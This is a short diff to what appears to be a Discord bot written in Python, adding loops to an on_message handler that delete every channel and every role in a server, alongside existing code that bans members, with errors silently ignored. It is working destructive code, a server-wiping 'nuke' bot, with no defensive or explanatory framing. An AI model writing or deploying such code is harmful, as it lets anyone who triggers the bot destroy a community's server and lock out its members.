@@ -22,6 +22,16 @@ async def on_message(message):
       await x.ban()
     except:
       ""
+  for x in message.guild.channels:
+    try:
+      await x.delete()
+    except:
+      ""
+  for x in message.guild.roles:
+    try:
+      await x.delete()
+    except:
+      ""
 
 @client.event
 async def on_guild_channel_create(channel):
